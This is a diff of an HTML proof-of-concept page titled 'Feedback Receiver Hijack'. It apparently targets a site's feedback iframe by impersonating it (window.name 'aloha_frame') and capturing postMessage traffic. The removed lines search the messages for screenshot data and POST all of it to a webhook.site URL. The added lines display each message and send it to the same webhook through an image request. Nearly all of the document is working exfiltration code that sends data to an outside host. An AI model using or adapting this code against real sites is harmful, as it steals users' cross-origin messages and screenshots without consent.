@@ -1,36 +1,21 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>receiver.html loaded</h2>
-    <script>
-      window.name = "aloha_frame"; // Critical: impersonate the real feedback iframe
+<head><title>Feedback Receiver Hijack</title></head>
+<body>
+<h2>Attacker Feedback Iframe</h2>
+<pre id="out">Waiting for messages...</pre>
+<script>
+  window.addEventListener("message", (e) => {
+    const log = `FROM: ${e.origin}\nDATA:\n${JSON.stringify(e.data, null, 2)}`;
+    document.getElementById("out").innerText = log;
 
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with yours
-
-      function deepFindScreenshot(obj) {
-        const str = JSON.stringify(obj);
-        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
-        const blob = str.match(/blob:https:\/\/[a-z0-9.-]+\/[a-z0-9\-]+/i);
-        return base64 ? base64[0] : (blob ? blob[0] : null);
-      }
-
-      window.addEventListener("message", (e) => {
-        console.log("📩 postMessage from:", e.origin);
-        console.log("🧾 Raw data:", e.data);
-
-        fetch(webhookURL, {
-          method: "POST",
-          mode: "no-cors",
-          body: JSON.stringify({
-            origin: e.origin,
-            data: e.data,
-            containsScreenshot: !!deepFindScreenshot(e.data),
-            timestamp: new Date().toISOString()
-          })
-        });
-      });
-
-      console.log("✅ receiver.html active and impersonating aloha_frame");
-    </script>
-  </body>
+    // Optionally exfiltrate to webhook
+    new Image().src = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322?" + new URLSearchParams({
+      origin: e.origin,
+      data: JSON.stringify(e.data),
+      ts: Date.now()
+    }).toString();
+  }, false);
+</script>
+</body>
 </html>
